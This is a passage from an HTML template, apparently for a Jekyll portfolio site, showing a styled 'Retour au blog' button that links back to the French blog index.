    <a href="{{ site.baseurl }}/fr/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Retour au blog
    </a>
</div>
